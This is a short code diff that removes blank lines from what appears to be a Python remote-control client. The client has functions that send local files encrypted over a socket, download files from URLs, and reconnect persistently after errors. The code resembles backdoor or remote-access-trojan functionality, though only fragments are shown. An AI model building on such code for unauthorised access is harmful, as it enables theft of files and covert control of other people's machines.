@@ -20,10 +20,8 @@ def upload(sock, fn):
     f = open(fn, 'rb')
     d = f.read()
     f.close()
-
     Send(sock, cipher, d, fn)
     time.sleep(1)
-
     return 'File sent 🍺'
   except Exception as e:
     return str(e) + ' ⚠️'
@@ -32,7 +30,6 @@ def dlhttp(sock, url):
   fn = url.split('/')[-1]
   fn = fn.split('?')[0]
   fn = fn.split('#')[0]
-
   try:
     f = open(fn, 'wb')
     f.write(urlopen(url).read())
@@ -99,7 +96,6 @@ while True:
           ret = str(e) + ' ⚠️'     
        
       Send(sock, cipher, res(ret))
-
   except socket.error:
     sock.close()
     time.sleep(10)
